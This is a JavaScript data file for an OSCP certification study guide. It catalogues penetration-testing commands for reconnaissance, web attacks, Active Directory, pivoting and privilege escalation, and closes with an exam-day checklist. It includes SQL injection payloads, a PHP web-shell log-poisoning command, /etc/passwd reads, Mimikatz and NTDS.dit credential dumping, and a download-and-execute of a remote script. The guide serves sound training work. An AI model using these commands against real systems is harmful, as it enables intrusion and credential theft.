const oscpData = {
  topics: [
    {
      id: "recon",
      title: "Information Gathering & Reconnaissance",
      description: "Passive and active reconnaissance techniques required to map a target's surface area, identify active hosts, services, and versions.",
      subtopics: [
        {
          name: "Passive Information Gathering",
          details: "Leverage OSINT resources to uncover system configurations, target networks, or user credentials without making direct contact with the target host.",
          commands: [
            { cmd: "whois example.com", desc: "Query database for domain ownership information" },
            { cmd: "dig axfr @ns1.example.com example.com", desc: "Attempt DNS zone transfer from target nameserver" },
            { cmd: "subfinder -d example.com -silent", desc: "Fast passive subdomain enumeration tool" }
          ],
          tips: [
            "Use search engine operators (Google Dorks) to look for exposed configuration files (e.g., filetype:log or filetype:sql).",
            "Leverage sites like crt.sh to look up certificate history and identify subdomains."
          ]
        },
        {
          name: "Active Scanning (Nmap)",
          details: "Identify open ports, services, operating systems, and basic vulnerabilities using structured port scanning.",
          commands: [
            { cmd: "nmap -sC -sV -oA nmap/initial <TARGET-IP>", desc: "Standard TCP initial sweep: Default scripts (-sC) + Service versions (-sV)" },
            { cmd: "nmap -p- --min-rate 1000 -oA nmap/allports <TARGET-IP>", desc: "Fast full-port TCP sweep. Run this first to find open ports quickly, then target those ports with -sC -sV" },
            { cmd: "nmap -sU --top-ports 100 -oA nmap/udp <TARGET-IP>", desc: "Scan top 100 UDP ports. UDP services are often vulnerable (e.g., SNMP, TFTP)" },
            { cmd: "nmap --script vuln -p 80,443 <TARGET-IP>", desc: "Run Nmap NSE vulnerability detection scripts against web ports" }
          ],
          tips: [
            "Always save scans in all formats (-oA) so you can reference them later in your documentation.",
            "Use --min-rate to speed up scans, but be careful of firewalls blocking too many rapid requests.",
            "Do not skip UDP ports entirely. SNMP (UDP 161) is a common foothold source."
          ]
        }
      ]
    },
    {
      id: "web",
      title: "Web Application Attacks",
      description: "Exploiting standard OWASP Top 10 vulnerabilities commonly present in web interfaces on standalones or entry points.",
      subtopics: [
        {
          name: "Web Enumeration & Directory Busting",
          details: "Locating hidden files, admin panels, and backend scripts.",
          commands: [
            { cmd: "gobuster dir -u http://<TARGET-IP>/ -w /usr/share/wordlists/dirb/common.txt -o gobuster.txt", desc: "Enumerate directories using a standard wordlist" },
            { cmd: "ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://<TARGET-IP>/FUZZ -e .php,.txt,.html -recursion", desc: "Directory busting with extensions and recursion" },
            { cmd: "nikto -h http://<TARGET-IP>/", desc: "Run a web vulnerability scanner looking for known outdated scripts and server configurations" }
          ],
          tips: [
            "Look at the Gobuster response codes. A 403 Forbidden might still mean the file exists, just that you can't view it directly.",
            "Always check robots.txt, sitemap.xml, and the HTML source of every page for comments or hidden developer paths."
          ]
        },
        {
          name: "SQL Injection (SQLi)",
          details: "Manipulating backend databases through input forms to read data, bypass login controls, or write web shells.",
          commands: [
            { cmd: "sqlmap -u \"http://<TARGET-IP>/page.php?id=1\" --batch --dbs", desc: "Automate database name enumeration (OSCP allows SQLMap on ONE target only during the exam)" },
            { cmd: "' OR 1=1 --", desc: "Simple authentication bypass payload for login fields" },
            { cmd: "' UNION SELECT 1,2,3,database(),user() -- -", desc: "Extract database metadata using UNION-based query manipulation" },
            { cmd: "' UNION SELECT 1,2,3,load_file('/etc/passwd') -- -", desc: "Read local files using database file read capabilities" }
          ],
          tips: [
            "Understand how to run manual SQLi, as you might need to bypass customized WAF rules that break automated tools.",
            "If you have DBA privileges, you can upload a web shell using INTO OUTFILE."
          ]
        },
        {
          name: "Local File Inclusion (LFI)",
          details: "Reading local target files through vulnerable parameter loading, sometimes chainable into Remote Code Execution (RCE).",
          commands: [
            { cmd: "curl http://<TARGET-IP>/index.php?page=../../../../etc/passwd", desc: "Basic directory traversal payload to read sensitive files" },
            { cmd: "curl http://<TARGET-IP>/index.php?page=php://filter/convert.base64-encode/resource=config.php", desc: "Read target php source code using PHP wrapper streams" },
            { cmd: "curl -H \"User-Agent: <?php system($_GET['cmd']); ?>\" http://<TARGET-IP>/ -d \"page=/var/log/apache2/access.log\"", desc: "Log poisoning to turn LFI into RCE (run cmd via access.log)" }
          ],
          tips: [
            "Use PHP wrappers (php://filter) to download base64-encoded source code, allowing you to find hardcoded passwords in config.php.",
            "Common logs to poison: /var/log/apache2/access.log, /var/log/nginx/access.log, /var/log/mail, /var/log/auth.log."
          ]
        }
      ]
    },
    {
      id: "ad",
      title: "Active Directory Attacks",
      description: "Fundamental techniques for attacking Active Directory environments. AD is worth 40 points in the exam and is a single dependency chain.",
      subtopics: [
        {
          name: "AD Enumeration",
          details: "Gathering domain structure, group memberships, users, trusts, and computers using internal domain tools.",
          commands: [
            { cmd: "net user /domain", desc: "List all users in the current active directory domain" },
            { cmd: "net group \"Domain Admins\" /domain", desc: "Identify all members of the Domain Admins group" },
            { cmd: "crackmapexec smb <CIDR> -u '' -p '' --shares", desc: "Perform a null session share sweep to locate readable network shares" },
            { cmd: "powershell -ep bypass -c \"Import-Module .\\PowerView.ps1; Get-NetComputer -Unconstrained\"", desc: "Enumerate domain computers looking for unconstrained delegation" },
            { cmd: "bloodhound-python -u 'user' -p 'password' -d domain.local -dc dc.domain.local -c All", desc: "Run Linux-based BloodHound collector to map AD trust paths" }
          ],
          tips: [
            "Active Directory is an all-or-nothing system in the exam: either you get the Domain Admin flag or you get 0 points for the set.",
            "Focus heavily on enumerating Group Policies, shares, and user descriptions. Developers often leave passwords in descriptions."
          ]
        },
        {
          name: "Kerberoasting & AS-REP Roasting",
          details: "Exploiting Kerberos configurations to request offline crackable tickets for service accounts or users without pre-authentication.",
          commands: [
            { cmd: "GetUserSPNs.py -request -dc-ip <DC-IP> domain.local/user:password", desc: "Extract Kerberoastable SPN tickets from Linux using Impacket" },
            { cmd: "GetNPUsers.py -request -dc-ip <DC-IP> domain.local/ -usersfile users.txt", desc: "Attempt AS-REP Roasting against users list (no password required, looks for DontRequirePreAuth)" },
            { cmd: "hashcat -m 13100 kerb_tickets.txt /usr/share/wordlists/rockyou.txt", desc: "Crack Kerberoasted TGS tickets offline using Hashcat" },
            { cmd: "hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt", desc: "Crack AS-REP Roasted hashes offline using Hashcat" }
          ],
          tips: [
            "Kerberoasting targets service accounts (SPNs), which often have high privileges and weak passwords.",
            "Run AS-REP Roasting first, as it does not require a valid user session, only a list of valid usernames."
          ]
        },
        {
          name: "Lateral Movement & Domain Dominance",
          details: "Moving across hosts in the domain and acquiring high-level access privileges.",
          commands: [
            { cmd: "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit", desc: "Dump cleartext passwords, NTLM hashes, and Kerberos tickets from memory (Mimikatz)" },
            { cmd: "psexec.py domain.local/administrator:password@<TARGET-IP>", desc: "Gain remote SYSTEM command line shell using administrative credentials" },
            { cmd: "secretsdump.py domain.local/administrator@<DC-IP> -just-dc-ntlm", desc: "Dump the NTDS.dit database hashes from Domain Controller" },
            { cmd: "wmiexec.py domain.local/user:password@<TARGET-IP>", desc: "Alternative remote shell execution using WMI (stealthier than PsExec)" }
          ],
          tips: [
            "If you dump an NTLM hash, you don't need to crack it to move laterally; you can use Pass-the-Hash with psexec.py or wmiexec.py.",
            "Be sure to clean up any administrative persistence tools (like PsExec services) before completing the exam."
          ]
        }
      ]
    },
    {
      id: "pivoting",
      title: "Port Forwarding & Pivoting",
      description: "Routing traffic through compromised internal servers to reach otherwise unreachable backend database nodes or domain subnets.",
      subtopics: [
        {
          name: "Local and Remote Port Forwarding",
          details: "Using SSH tunnels to expose backend service ports to your local attacking machine.",
          commands: [
            { cmd: "ssh -L 8080:127.0.0.1:80 user@<PIVOT-IP>", desc: "Local Port Forward: Forward local 8080 to remote 80 on the pivot machine" },
            { cmd: "ssh -R 9001:127.0.0.1:9001 user@<PIVOT-IP>", desc: "Remote Port Forward: Forward remote port 9001 back to local attacking machine (useful for reverse shells)" }
          ],
          tips: [
            "A Local Port Forward is for EXPOSING an internal port to your attacker box.",
            "A Remote Port Forward is for RECEIVING connections from inside the target network back to your attacker box."
          ]
        },
        {
          name: "Dynamic Pivoting (Chisel & Ligolo-ng)",
          details: "Setting up lightweight SOCKS tunnels and virtual interfaces to route full subnets of network traffic.",
          commands: [
            { cmd: "chisel server -p 8000 --reverse", desc: "Run Chisel server on local Kali machine to listen for incoming pivot connections" },
            { cmd: "chisel client <KALI-IP>:8000 R:socks", desc: "Run Chisel client on compromised Windows/Linux host to connect back and open a SOCKS proxy" },
            { cmd: "proxychains nmap -sT -Pn -p 80,443 <INTERNAL-IP>", desc: "Run scans or tools through Proxychains routed via your SOCKS proxy" }
          ],
          tips: [
            "Configure /etc/proxychains4.conf with the proper port (matching your Chisel client e.g. socks5 127.0.0.1 1080).",
            "Nmap scans through proxychains must use TCP Connect scanning (-sT) and No Ping (-Pn), as ICMP/SYN packets cannot be routed over standard SOCKS."
          ]
        }
      ]
    },
    {
      id: "privesc",
      title: "Privilege Escalation",
      description: "Escalating a low-privilege user shell (e.g., www-data or service accounts) to administrative or root control on both Linux and Windows.",
      subtopics: [
        {
          name: "Linux Privilege Escalation",
          details: "Finding misconfigured scripts, SUID files, vulnerable kernels, or sudo permissions.",
          commands: [
            { cmd: "sudo -l", desc: "Check current user's allowed sudo privileges" },
            { cmd: "find / -perm -u=s -type f 2>/dev/null", desc: "Find all files with SUID (Set Owner User ID) bit set" },
            { cmd: "cat /etc/crontab", desc: "Inspect system-wide scheduled cronjobs running as root or administrative accounts" },
            { cmd: "wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -O linpeas.sh; chmod +x linpeas.sh; ./linpeas.sh", desc: "Download and execute LinPEAS local automation scanner" }
          ],
          tips: [
            "Cross-reference any found SUID or sudo-capable binaries on GTFOBins (gtfobins.github.io) to see if they can execute shell commands.",
            "Always inspect writable configurations: if you can write to /etc/passwd or /etc/shadow, you can overwrite root's password."
          ]
        },
        {
          name: "Windows Privilege Escalation",
          details: "Exploiting service permissions, registry settings, token privileges, or kernel vulnerabilities.",
          commands: [
            { cmd: "whoami /priv", desc: "List current user's privileges. Look for SeImpersonatePrivilege, SeDebugPrivilege, etc." },
            { cmd: "powershell -ep bypass -c \"Import-Module .\\PowerUp.ps1; Invoke-AllChecks\"", desc: "Run PowerUp check tool to look for misconfigured services and path hijacking" },
            { cmd: "reg query HKLM\\SYSTEM\\CurrentControlSet\\Services /s /f \"ImagePath\"", desc: "Check registry for modifiable service paths" },
            { cmd: "winPEASany.exe", desc: "Run WinPEAS executable to automate privilege checks on Windows systems" }
          ],
          tips: [
            "If SeImpersonatePrivilege is enabled, use PrintSpoofer or GodLpotato to escalate to local NT AUTHORITY\\SYSTEM.",
            "Check for Unquoted Service Paths. If a service path has spaces and is not quoted, you can drop your own executable into the folder structure."
          ]
        }
      ]
    }
  ],
  moments: [
    {
      moment: "Pre-Exam Prep",
      timeframe: "24-48 Hours Before Exam",
      objective: "Prepare the environment, hardware, and physical space for proctoring verification.",
      checklist: [
        "Verify your webcam, microphone, and internet bandwidth meet OffSec proctoring specs.",
        "Ensure your government-issued ID is current and sitting ready next to your desk.",
        "Prepare foods, snacks, and water to minimize stepping away from your workspace.",
        "Clear your desk and immediate room environment. The proctor will request a 360-degree sweep.",
        "Ensure virtual machine software (VirtualBox/VMware) and your Kali OS have recent backups created."
      ]
    },
    {
      moment: "Proctor Verification",
      timeframe: "Exam Start -15 mins",
      objective: "Log into the proctoring platform and verify authentication credentials.",
      checklist: [
        "Launch the proctoring extension/software link exactly 15 minutes before the start time.",
        "Present your government ID clearly to the webcam when requested.",
        "Perform a slow 360-degree pan of your desk, walls, and floor using the webcam.",
        "Verify that only one monitor is active unless you explicitly cleared a multi-monitor layout.",
        "Once verified, wait for the VPN pack and connection credentials email."
      ]
    },
    {
      moment: "Phase 1: Initial Sweeps & AD Scanning",
      timeframe: "Hour 0 - Hour 1",
      objective: "Discover the infrastructure layout and launch full scans against all targets.",
      checklist: [
        "Initialize your VPN connection and verify you can ping target IPs.",
        "Create target folders: `mkdir -p OSCP/{AD-Set,Standalone1,Standalone2,Standalone3}/nmap`.",
        "Launch fast TCP sweeps: `nmap -p- --min-rate 1000 -oA nmap/allports <IP>` against every target.",
        "Once ports are identified, trigger detailed version scans: `nmap -sC -sV -p <PORTS> -oA nmap/detail <IP>`.",
        "Launch a background UDP top 100 scan against all boxes: `nmap -sU --top-ports 100 <IP>`."
      ]
    },
    {
      moment: "Phase 2: Active Directory Foothold",
      timeframe: "Hour 1 - Hour 4",
      objective: "Gain administrative control of the primary AD client machine.",
      checklist: [
        "Review detailed scans of the AD targets. Look for web applications, SMB shares, or custom interfaces.",
        "Conduct web app directory busting or check for known vulnerabilities in open services.",
        "Obtain initial credentials or an exploit vector to access the client AD host.",
        "Execute local privilege escalation checks (WinPEAS/LinPEAS) to escalate to Local Admin/SYSTEM.",
        "Immediately take screenshots of the user proof file (`type user.txt` or `cat user.txt`) with the IP address and date."
      ]
    },
    {
      moment: "Phase 3: AD Domain Admin Compromise",
      timeframe: "Hour 4 - Hour 8",
      objective: "Compromise the Active Directory Domain Controller and capture the final AD flag.",
      checklist: [
        "Dump local SAM hashes, secrets, and Kerberos tickets on the client host.",
        "Run AD enumeration (PowerView/BloodHound/CME) to map escalation path to Domain Admin.",
        "Leverage Kerberoasting, AS-REP roasting, or vulnerable GPO settings to move laterally.",
        "Compromise the Domain Controller (DC) using administrative tools or lateral movement protocols.",
        "Extract the AD proof flag from the Domain Controller. Save the output and screenshot showing `ipconfig` / `hostname`."
      ]
    },
    {
      moment: "Phase 4: Mid-Exam Pause & Re-hydration",
      timeframe: "Hour 8 - Hour 9",
      objective: "Mandatory physical rest, water, and food intake to avoid mental fatigue.",
      checklist: [
        "Inform the proctor via chat that you are stepping away for a meal/break.",
        "Step away from your workstation completely; do not think about the targets.",
        "Eat a high-protein meal and hydrate heavily.",
        "Review your captured flags so far and verify they are saved in a text document with proof commands."
      ]
    },
    {
      moment: "Phase 5: Attack Standalone Targets",
      timeframe: "Hour 9 - Hour 16",
      objective: "Attack the standalone hosts sequentially to secure passing points (minimum 70 points).",
      checklist: [
        "Focus on one standalone target at a time. Do not jump between hosts rapidly.",
        "Inspect the open service versions found in your initial scan against Exploit-DB or GitHub repositories.",
        "Gain a low-privilege foothold. Record the exact steps, tools used, and payloads.",
        "Grab the user flag: screenshot `whoami` + `cat user.txt` / `type user.txt`.",
        "Run privilege escalation sweeps and exploit local configuration weaknesses.",
        "Acquire root/SYSTEM privileges on the standalone and capture the root flag."
      ]
    },
    {
      moment: "Phase 6: Proof Verification & Backup Check",
      timeframe: "Hour 16 - Hour 20",
      objective: "Audit your collected data, verification commands, and screenshots.",
      checklist: [
        "Double-check every single proof flag: must contain the exact string.",
        "Run the required proof verification commands for each flag: `whoami`, `ipconfig` / `ifconfig`, and contents of file.",
        "Ensure you have a screenshot of the flag terminal command WITH the IP visible in the background or output.",
        "Create an outline of the final report. Make sure you can explain the exact exploitation chain."
      ]
    },
    {
      moment: "Phase 7: Final Report Compilation",
      timeframe: "Post-Exam 24-Hours",
      objective: "Generate the official PDF report documenting all vulnerabilities and steps.",
      checklist: [
        "Use a standard Markdown-to-PDF template (like the OffSec official template).",
        "Document every step sequentially: vulnerability description, proof of concept, exploitation commands, and screenshots.",
        "Include remediation recommendations for every vulnerability discovered.",
        "Double check the final PDF contains your name, email, OSID, and follows naming rules.",
        "Submit the PDF file through the OffSec portal and confirm submission confirmation email."
      ]
    }
  ]
};
